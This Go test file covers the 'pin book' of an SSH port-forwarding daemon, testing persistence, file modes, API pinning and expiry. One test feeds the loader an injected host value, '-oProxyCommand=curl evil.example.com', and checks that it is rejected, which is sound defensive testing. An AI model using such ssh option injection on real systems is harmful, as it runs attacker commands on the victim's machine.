package main

import (
	"encoding/json"
	"os"
	"path/filepath"
	"testing"
	"time"
)

func testPins(t *testing.T) (*pinBook, string) {
	t.Helper()
	file := filepath.Join(t.TempDir(), "sub", "pinned")
	return newPinBook(file), file
}

// A pin is configuration and must outlive the daemon, like a manually added host and
// unlike a forward.
func TestPinsPersistAcrossReload(t *testing.T) {
	book, file := testPins(t)
	p := pin{Host: "code", Direction: string(dirLocal), RemotePort: 8530, LocalPort: 8530, Label: "mkdp"}
	if err := book.Add(p); err != nil {
		t.Fatal(err)
	}

	reloaded := newPinBook(file)
	got := reloaded.List()
	if len(got) != 1 || got[0] != p {
		t.Fatalf("pin did not survive a reload: %+v", got)
	}
	if !reloaded.Has(p.key()) {
		t.Fatal("reloaded book does not know its own pin")
	}

	if _, err := reloaded.Remove(p.key()); err != nil {
		t.Fatal(err)
	}
	if len(newPinBook(file).List()) != 0 {
		t.Fatal("a removed pin came back after a reload")
	}
}

// The file holds what amounts to ssh arguments, so its mode matters, and so does the
// mode of the directory it gets created in.
func TestPinFilePermissions(t *testing.T) {
	book, file := testPins(t)
	if err := book.Add(pin{Host: "code", Direction: string(dirLocal), RemotePort: 8530}); err != nil {
		t.Fatal(err)
	}

	fi, err := os.Stat(file)
	if err != nil {
		t.Fatal(err)
	}
	if perm := fi.Mode().Perm(); perm != 0o600 {
		t.Errorf("pin file mode %04o, want 0600", perm)
	}
	di, err := os.Stat(filepath.Dir(file))
	if err != nil {
		t.Fatal(err)
	}
	if perm := di.Mode().Perm(); perm&0o077 != 0 {
		t.Errorf("pin directory mode %04o is readable beyond the owner", perm)
	}
}

// The daemon wrote this file, but it is still a file in a home directory whose contents
// become ssh argv. Trusting it because we wrote it last time is the wrong instinct.
func TestPinFileIsRevalidatedOnLoad(t *testing.T) {
	dir := t.TempDir()
	file := filepath.Join(dir, "pinned")
	body, err := json.Marshal([]pin{
		{Host: "code", Direction: string(dirLocal), RemotePort: 8530},
		{Host: "-oProxyCommand=curl evil.example.com", Direction: string(dirLocal), RemotePort: 8530},
		{Host: "code", Direction: "sideways", RemotePort: 8530},
		{Host: "code", Direction: string(dirLocal), RemotePort: 8530, RemoteHost: "db:80:other"},
		{Host: "code", Direction: string(dirLocal), RemotePort: 80},
		{Host: "code", Direction: string(dirRemote), RemotePort: 3000}, // no local port
	})
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(file, body, 0o600); err != nil {
		t.Fatal(err)
	}

	got := newPinBook(file).List()
	if len(got) != 1 || got[0].Host != "code" || got[0].RemotePort != 8530 {
		t.Fatalf("kept %d pins, want only the sound one: %+v", len(got), got)
	}
}

func TestMalformedPinFileIsIgnoredNotFatal(t *testing.T) {
	file := filepath.Join(t.TempDir(), "pinned")
	if err := os.WriteFile(file, []byte("{not json"), 0o600); err != nil {
		t.Fatal(err)
	}
	if got := newPinBook(file).List(); len(got) != 0 {
		t.Fatalf("garbage produced pins: %+v", got)
	}
}

/* ---- through the API ------------------------------------------------- */

func TestAdminCanPinOnCreate(t *testing.T) {
	h, m, _ := testServer(t)

	w := do(t, h, "POST", "/api/forward", `{"remote_port":8530,"label":"mkdp","pinned":true,"ttl":3600}`)
	if w.Code != 200 {
		t.Fatalf("code %d: %s", w.Code, w.Body)
	}

	list := m.List()
	if len(list) != 1 || !list[0].Pinned {
		t.Fatalf("mapping was not pinned: %+v", list)
	}
	// A pin and a lease are contradictory instructions; pinning wins.
	if list[0].TTL != 0 {
		t.Fatalf("pinned mapping kept a ttl of %d", list[0].TTL)
	}
	if pins := m.pins.List(); len(pins) != 1 || pins[0].Label != "mkdp" {
		t.Fatalf("nothing was written to the pin book: %+v", pins)
	}
}

func TestAdminCanPinAndUnpinAnExistingMapping(t *testing.T) {
	h, m, _ := testServer(t)
	post(t, h, `{"remote_port":8530}`)
	id := m.List()[0].ID

	if w := do(t, h, "PATCH", "/api/forward/"+id, `{"pinned":true}`); w.Code != 200 {
		t.Fatalf("pin: %d %s", w.Code, w.Body)
	}
	if v := m.List()[0]; !v.Pinned || v.TTL != 0 {
		t.Fatalf("pinning did not take, or left the lease running: %+v", v)
	}
	if !m.pins.Has(fwdKey{host: "code", direction: dirLocal, remotePort: 8530}) {
		t.Fatal("the pin was not persisted")
	}

	if w := do(t, h, "PATCH", "/api/forward/"+id, `{"pinned":false}`); w.Code != 200 {
		t.Fatalf("unpin: %d %s", w.Code, w.Body)
	}
	if m.List()[0].Pinned {
		t.Fatal("unpinning did not take")
	}
	if len(m.pins.List()) != 0 {
		t.Fatal("the pin outlived the unpin")
	}
}

// Closing a pinned mapping has to remove the pin too. Otherwise the next tick puts it
// straight back, which reads as the daemon ignoring the operator.
func TestAdminCloseOfAPinnedMappingRemovesThePin(t *testing.T) {
	h, m, _ := testServer(t)
	if w := do(t, h, "POST", "/api/forward", `{"remote_port":8530,"pinned":true}`); w.Code != 200 {
		t.Fatalf("setup: %d %s", w.Code, w.Body)
	}
	id := m.List()[0].ID

	if w := do(t, h, "DELETE", "/api/forward/"+id, ""); w.Code != 200 {
		t.Fatalf("close: %d %s", w.Code, w.Body)
	}
	if n := len(m.List()); n != 0 {
		t.Fatalf("the mapping is still live (%d)", n)
	}
	if n := len(m.pins.List()); n != 0 {
		t.Fatalf("%d pins survived the close; reconcile would re-create the mapping", n)
	}

	// And with the pin gone, a reconcile leaves it gone.
	m.ensurePins()
	if n := len(m.List()); n != 0 {
		t.Fatalf("the closed mapping came back (%d)", n)
	}
}

// The pin flag travels with the mapping in every listing, so the console can mark the
// rows that will outlive a restart without a second request.
func TestPinFlagIsVisibleInTheList(t *testing.T) {
	h, m, _ := testServer(t)

	if w := post(t, h, `{"remote_port":8530,"pinned":true}`); w.Code != 200 {
		t.Fatalf("pin: %d %s", w.Code, w.Body)
	}
	if n := len(m.pins.List()); n != 1 {
		t.Fatalf("pin book holds %d pins, want 1", n)
	}

	w := do(t, h, "GET", "/api/forwards", "")
	var got []forwardView
	if err := json.Unmarshal(w.Body.Bytes(), &got); err != nil {
		t.Fatal(err)
	}
	if len(got) != 1 || !got[0].Pinned {
		t.Fatalf("the list hid the pin flag: %+v", got)
	}
}

// Editing a pinned mapping's ports must move the pin with it, or the next restart
// re-creates the mapping the operator has just edited away from.
func TestEditingAPinnedMappingMovesThePin(t *testing.T) {
	h, m, _ := testServer(t)
	if w := do(t, h, "POST", "/api/forward", `{"remote_port":8530,"pinned":true}`); w.Code != 200 {
		t.Fatalf("setup: %d %s", w.Code, w.Body)
	}
	id := m.List()[0].ID

	if w := do(t, h, "PATCH", "/api/forward/"+id, `{"remote_port":8531}`); w.Code != 200 {
		t.Fatalf("edit: %d %s", w.Code, w.Body)
	}
	pins := m.pins.List()
	if len(pins) != 1 || pins[0].RemotePort != 8531 {
		t.Fatalf("the pin did not follow the mapping: %+v", pins)
	}
}

// Start() asserts pins before anything else asks for a forward, which is what makes a
// pinned mapping survive a daemon restart at all.
func TestStartAssertsPins(t *testing.T) {
	m, _ := testManager(t)
	if err := m.pins.Add(pin{Host: "code", Direction: string(dirLocal), RemotePort: 8530}); err != nil {
		t.Fatal(err)
	}
	m.masters = map[string]masterCtl{"code": &fakeMaster{up: true}}

	m.Start()

	list := m.List()
	if len(list) != 1 || !list[0].Pinned {
		t.Fatalf("Start did not assert the pin: %+v", list)
	}
}

func TestPinnedForwardNeverExpires(t *testing.T) {
	m, _ := testManager(t)
	t0 := time.Now()
	m.now = func() time.Time { return t0 }

	if _, _, err := m.Open(openReq{host: "code", remotePort: 8530, ttl: time.Minute,
		pinned: true}); err != nil {
		t.Fatal(err)
	}
	m.now = func() time.Time { return t0.Add(500 * time.Hour) }
	m.reap(true)

	if n := len(m.List()); n != 1 {
		t.Fatalf("a pinned mapping expired (%d entries)", n)
	}
}

// A pin that names the daemon's own port can never be installed, so retrying it every
// tick would only fill the log. The loop drops it instead, once.
func TestPinOfTheDaemonsOwnPortIsDroppedNotRetried(t *testing.T) {
	m, _ := testManager(t)
	m.selfPort = 9996
	if err := m.pins.Add(pin{Host: "code", Direction: string(dirRemote), LocalPort: 9996, RemotePort: 9996}); err != nil {
		t.Fatal(err)
	}
	m.ensurePins()
	if n := len(m.pins.List()); n != 0 {
		t.Fatalf("pin book still holds %d pin(s), want 0", n)
	}
	if n := len(m.List()); n != 0 {
		t.Fatalf("%d mapping(s) exist, want 0", n)
	}
	// And a harmless pin next to it is unaffected.
	if err := m.pins.Add(pin{Host: "code", Direction: string(dirLocal), LocalPort: 0, RemotePort: 8530}); err != nil {
		t.Fatal(err)
	}
	m.ensurePins()
	if n := len(m.pins.List()); n != 1 {
		t.Fatalf("the ordinary pin was dropped too (%d left)", n)
	}
}
